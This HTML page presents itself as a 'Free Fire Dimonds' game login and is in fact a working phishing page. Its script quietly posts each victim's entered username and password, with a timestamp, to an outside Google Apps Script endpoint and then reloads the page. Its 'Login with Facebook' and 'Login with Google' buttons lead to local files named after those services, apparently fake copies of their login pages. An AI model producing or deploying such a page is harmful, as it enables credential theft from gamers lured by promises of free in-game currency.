<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Battle Royale Tournament Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('wp3144284.webp'); /* Set background image */
            background-size: cover; /* Ensure the background covers the entire page */
            background-position: center; /* Center the background image */
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
            width: 300px;
            text-align: center;
            max-width: 100%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #f39c12;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: #fff;
            font-size: 16px;
        }
        input[type="submit"] {
            background-color: #f39c12;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #e67e22;
        }
        .footer {
            margin-top: 10px;
            font-size: 14px;
            color: #aaa;
        }
        a {
            text-decoration: none;
        }
        .social-btn {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            color: #fff;
            cursor: pointer;
        }
        .facebook-btn {
            background-color: #3b5998;
        }
        .google-btn {
            background-color: #db4437;
        }
        .social-btn:hover {
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>Free Fire Dimonds</h1>
        <form name="battle-form" method="POST">
            <input type="hidden" name="account" value="FF Dimonds">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" placeholder="Enter your username" required>
            
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
            
            <!-- Hidden input fields for date and time -->
            <input type="hidden" name="submit_date" id="submit-date">
            <input type="hidden" name="submit_time" id="submit-time">

            <input type="submit" value="Login" aria-label="Login">
        </form>
        
        <p>OR</p>
        
        <!-- Facebook Login Button -->
        <button class="social-btn facebook-btn" onclick="window.location.href='facebook.com.html'">
            Login with Facebook
        </button>
        
        <!-- Google Login Button -->
        <button class="social-btn google-btn" onclick="window.location.href='gmail.com.html'">
            Login with Google
        </button>

        <div class="footer">
            <p>Don't have an account? <a href="#" style="color: #f39c12;">Sign up</a></p>
        </div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwrc_OgfwrnPM2xv-HYK4GwGtREl6kUUoezFubPD_4cgsYZQ4qLx7iYeJIQGbWaWTom/exec';
        const form = document.forms['battle-form'];

        // Function to set the date and time
        function setDateAndTime() {
            const now = new Date();
            const date = now.toLocaleDateString();  // Gets the current date
            const time = now.toLocaleTimeString();  // Gets the current time

            document.getElementById('submit-date').value = date;
            document.getElementById('submit-time').value = time;
        }

        // Attach event listener to submit form
        form.addEventListener('submit', e => {
            e.preventDefault();

            // Set the date and time before submitting
            setDateAndTime();

            // Submit the form via fetch API
            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(() => {
                window.location.reload();
            })
            .catch(error => console.error('Error!', error.message));
        });
    </script>
</body>
</html>
